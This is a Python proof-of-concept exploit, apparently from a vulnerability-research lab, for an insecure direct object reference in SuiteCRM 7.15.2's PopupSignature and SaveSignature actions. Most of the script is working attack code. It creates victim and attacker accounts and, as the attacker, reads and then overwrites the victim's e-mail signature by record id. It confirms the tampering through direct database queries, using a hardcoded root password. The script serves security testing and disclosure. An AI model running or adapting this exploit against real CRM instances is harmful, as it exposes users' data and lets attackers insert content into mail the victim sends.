#!/usr/bin/env python3
"""
VULN-033 -- Users signatures: read + overwrite any user's e-mail signature (IDOR)

Target: SuiteCRM 7.15.2 (targets/SuiteCRM/)
Sinks:
  modules/Users/PopupSignature.php:56-96 -- retrieve($_REQUEST['record']) then
      echoes signature_html/signature with no owner check.
  modules/Users/SaveSignature.php:44-58  -- retrieve($_REQUEST['record']), then
      overwrites name/signature/signature_html from the request and calls
      save(), again with no owner check; also allows planting `user_id` from
      $_REQUEST['the_user_id'] when the loaded record has none.

Both scripts are dispatched via SugarController::callLegacyCode()'s
"classic module" fallback (no modules/Users/views/view.*.php exists for
either action name, so the flat file is require_once()'d directly, wrapped
in the normal page chrome).

What this script does
----------------------
1. Creates victim V and attacker A (fresh, unrelated low-priv users).
2. As V: creates her own e-mail signature (SaveSignature with no `record`
   -- a new UserSignature row is created and `user_id` is set from
   `the_user_id`, matching how the real EditView's hidden field seeds a
   brand-new signature for yourself). Extracts the new signature's GUID
   from the `refresh_signature_list("<guid>","<name>")` JS call the script
   echoes back to the browser that saved it.
3. As A: READ -- GET PopupSignature?record=<sig_id> -- assert V's
   signature body marker is returned.
4. As A: OVERWRITE -- POST SaveSignature record=<sig_id> with attacker-
   controlled name/description -- verify via the db container that the
   SAME row (same id) now carries the attacker's payload while `user_id`
   is UNCHANGED (still V's id) -- i.e. the victim's own signature, the one
   that gets appended to her outgoing mail, now carries attacker content.

Environment variables:
    BASE_URL, ADMIN_USER, ADMIN_PASS
"""
import os
import re
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, log, banner, rand, verdict,
                      admin_session, create_user, web_login)

VULN_ID = "VULN-033"
HERE = os.path.dirname(os.path.abspath(__file__))
COMPOSE_CWD = "/opt/cvehunter/targets/SuiteCRM"
COMPOSE_PROJECT = "cvehunterlab_suitecrm"


def db_query(sql):
    cmd = ["docker", "compose", "-p", COMPOSE_PROJECT, "exec", "-T", "db",
           "mysql", "-uroot", "-pSuiteRoot!2026x", "suitecrm", "-e", sql]
    res = subprocess.run(cmd, cwd=COMPOSE_CWD, capture_output=True, text=True, timeout=30)
    return res.stdout


def main():
    banner(VULN_ID, "Users signatures: read + overwrite any user's signature (IDOR)")

    log("SETUP", "admin web login; provisioning victim (V) and attacker (A)")
    admin = admin_session()
    victim = create_user(admin, "Victim@2026x!")
    attacker = create_user(admin, "Attacker@2026x!")
    log("INFO", f"victim   = {victim['user_name']} ({victim['id']})")
    log("INFO", f"attacker = {attacker['user_name']} ({attacker['id']})")

    vs = web_login(victim["user_name"], victim["password"])

    log("SETUP", "as V: create her own e-mail signature via SaveSignature (record empty -> new row, user_id=the_user_id)")
    sig_name = rand("V033Sig")
    sig_marker = rand("SECRETSIG033")
    r = vs.post(f"{BASE_URL}/index.php", data={
        "module": "Users", "action": "SaveSignature",
        "the_user_id": victim["id"], "name": sig_name, "description": f"<p>{sig_marker}</p>",
    }, headers={"Referer": f"{BASE_URL}/index.php?module=Users&action=EditView"}, timeout=30)
    m = re.search(r'refresh_signature_list\("([0-9a-fA-F-]{36})"', r.text)
    if not m:
        verdict(VULN_ID, "FAILED", "could not create victim's signature (refresh_signature_list id not found)")
        sys.exit(1)
    sig_id = m.group(1)
    log("OK", f"Signature created: id={sig_id} name={sig_name!r} body marker={sig_marker!r}, user_id=V")

    db_before = db_query(f"SELECT id,user_id,name,signature_html,deleted FROM users_signatures WHERE id='{sig_id}';")
    log("INFO", f"db row before attack:\n{db_before.strip()}")

    as_ = web_login(attacker["user_name"], attacker["password"])

    # ---- READ ----
    log("STEP", "as A: read V's signature purely by id (PopupSignature)")
    read_req_txt = (
        f"GET /index.php?module=Users&action=PopupSignature&record={sig_id} HTTP/1.1\n"
        f"Host: localhost:33116\nCookie: PHPSESSID=<attacker-session>\n\n"
    )
    r2 = as_.get(f"{BASE_URL}/index.php", params={"module": "Users", "action": "PopupSignature", "record": sig_id}, timeout=30)
    read_leak = sig_marker in r2.text
    log("PROOF", f"read status={r2.status_code} len={len(r2.text)} -- V's body marker present in A's response: {read_leak}")

    # ---- OVERWRITE ----
    log("STEP", "as A: overwrite V's signature content by id (SaveSignature), leaving user_id untouched")
    payload_marker = rand("PWNEDSIG033")
    overwrite_req_txt = (
        f"POST /index.php?module=Users&action=SaveSignature HTTP/1.1\n"
        f"Host: localhost:33116\nCookie: PHPSESSID=<attacker-session>\n"
        f"Content-Type: application/x-www-form-urlencoded\n\n"
        f"record={sig_id}&name=pwned-by-attacker&description=%3Cp%3E{payload_marker}%3C%2Fp%3E\n"
    )
    r3 = as_.post(f"{BASE_URL}/index.php", data={
        "module": "Users", "action": "SaveSignature", "record": sig_id,
        "name": "pwned-by-attacker", "description": f"<p>{payload_marker}</p>",
    }, headers={"Referer": f"{BASE_URL}/index.php?module=Users&action=EditView"}, timeout=30)
    log("INFO", f"overwrite status={r3.status_code}")

    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write("### 1) READ another user's signature by id\n" + read_req_txt + "\n")
        f.write("### 2) OVERWRITE another user's signature content by id\n" + overwrite_req_txt)

    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write("### READ response (PopupSignature) -- excerpt around the leaked marker ###\n")
        idx = r2.text.find(sig_marker)
        f.write(r2.text[max(0, idx - 200):idx + 200] if idx != -1 else "(marker not found)")
        f.write("\n\n### OVERWRITE response status ###\n")
        f.write(f"status: {r3.status_code}\n\n")

    log("STEP", "verify via db container: same row id, user_id UNCHANGED (still V), content now attacker's")
    db_after = db_query(f"SELECT id,user_id,name,signature_html,deleted FROM users_signatures WHERE id='{sig_id}';")
    log("PROOF", f"db row after attacker's overwrite:\n{db_after.strip()}")

    with open(os.path.join(HERE, "response.txt"), "a") as f:
        f.write("### db container verification ###\n")
        f.write(f"SELECT id,user_id,name,signature_html,deleted FROM users_signatures WHERE id='{sig_id}';\n\n")
        f.write("-- BEFORE --\n" + db_before + "\n-- AFTER --\n" + db_after)

    with open(os.path.join(HERE, "evidence", "db_before_after.txt"), "w") as f:
        f.write(f"Signature id: {sig_id}\nOwner (user_id, should be unchanged): {victim['id']} ({victim['user_name']})\n")
        f.write(f"Attacker: {attacker['id']} ({attacker['user_name']})\n\n")
        f.write("-- BEFORE (created by victim) --\n" + db_before)
        f.write("\n-- AFTER (overwritten by attacker) --\n" + db_after)

    overwrite_ok = False
    user_id_preserved = False
    for line in db_after.strip().splitlines()[1:]:
        cols = line.split("\t")
        if len(cols) >= 4 and cols[0] == sig_id:
            user_id_preserved = (cols[1] == victim["id"])
            overwrite_ok = (payload_marker in cols[3])

    log("PROOF", f"row user_id still == victim's id (ownership unchanged): {user_id_preserved}")
    log("PROOF", f"row signature_html now contains attacker payload: {overwrite_ok}")

    if not read_leak:
        verdict(VULN_ID, "FAILED", "attacker did not receive victim's signature body on read")
        sys.exit(1)
    if not (overwrite_ok and user_id_preserved):
        verdict(VULN_ID, "FAILED", "attacker's overwrite did not land on the victim's own (still-owned) row")
        sys.exit(1)

    log("OK", "attacker read AND overwrote victim's own signature; victim's future outgoing mail now carries attacker content")
    verdict(VULN_ID, "CONFIRMED",
            f"read leaked '{sig_marker}'; overwrite planted '{payload_marker}' on V's row (user_id unchanged)")
    sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except Exception as exc:  # noqa: BLE001
        log("FAIL", f"unhandled exception: {exc!r}")
        verdict(VULN_ID, "FAILED", f"unhandled exception: {exc}")
        sys.exit(1)
